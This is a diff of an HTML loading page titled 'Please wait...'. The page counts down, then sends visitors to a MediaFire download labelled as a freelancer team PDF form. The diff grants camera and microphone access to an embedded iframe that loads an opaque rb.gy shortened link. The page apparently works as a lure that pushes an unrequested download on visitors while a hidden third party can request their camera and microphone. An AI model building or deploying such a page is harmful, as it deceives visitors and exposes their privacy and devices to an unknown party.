@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <title>Please wait...</title>
 
   <style>
@@ -28,7 +29,7 @@
       padding: 30px 20px;
       border-radius: 18px;
       background: #1f2937;
-      box-shadow: 0 10px 35px rgba(0,0,0,.35);
+      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.35);
     }
 
     h2 {
@@ -63,42 +64,69 @@
       font-size: 16px;
       cursor: pointer;
     }
+
+    button:hover {
+      background: #1d4ed8;
+    }
   </style>
 </head>
 
 <body>
 
   <div class="box">
+
     <h2>Please wait...</h2>
 
     <div id="countdown">3</div>
 
     <p>Loading the next page...</p>
 
+    <!-- Link 1 -->
     <iframe
       src="https://rb.gy/wkpsot"
-      title="Loading Link 1">
+      allow="camera; microphone"
+      title="Link 1">
     </iframe>
 
+    <!-- Fallback button -->
     <div class="fallback" id="fallback">
-      <p>If the next page didn't open automatically:</p>
-      <button onclick="openLink2()">Open Download</button>
+
+      <p>
+        If the download page didn't open automatically:
+      </p>
+
+      <button type="button" onclick="openLink2()">
+        Open Download
+      </button>
+
     </div>
+
   </div>
 
+
   <script>
-    const link2 = "https://www.mediafire.com/file/9d3onww0beug85e/NB+Freelancer+Team+Form.pdf/file";
+
+    // Link 2
+    const link2 =
+      "https://www.mediafire.com/file/9d3onww0beug85e/NB+Freelancer+Team+Form.pdf/file";
+
 
     let seconds = 3;
 
-    const countdown = document.getElementById("countdown");
-    const fallback = document.getElementById("fallback");
+    const countdown =
+      document.getElementById("countdown");
 
+    const fallback =
+      document.getElementById("fallback");
+
+
+    // Countdown
     const timer = setInterval(() => {
 
       seconds--;
 
       countdown.textContent = seconds;
+
 
       if (seconds <= 0) {
 
@@ -111,15 +139,21 @@
     }, 1000);
 
 
+    // Open Link 2
     function openLink2() {
 
       window.location.href = link2;
 
+
+      // Show fallback button
       setTimeout(() => {
+
         fallback.style.display = "block";
+
       }, 1500);
 
     }
+
   </script>
 
 </body>
